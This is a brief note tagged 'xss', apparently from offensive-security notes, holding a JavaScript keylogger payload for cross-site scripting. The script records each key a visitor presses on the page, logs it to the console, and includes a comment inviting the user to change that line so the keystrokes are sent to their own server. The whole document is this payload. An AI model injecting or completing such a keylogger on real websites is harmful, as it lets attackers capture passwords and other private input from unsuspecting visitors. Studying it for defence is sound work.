#xss 

```html
<script type="text/javascript">
 // Variable to store key-strokes in
 let l = "";

 // Event to listen for key presses
 document.onkeypress = function (e) {    
   l += e.key; // If user types, log it to the l variable
   console.log(l); // Update this line to post to your own server
 }
</script> 
```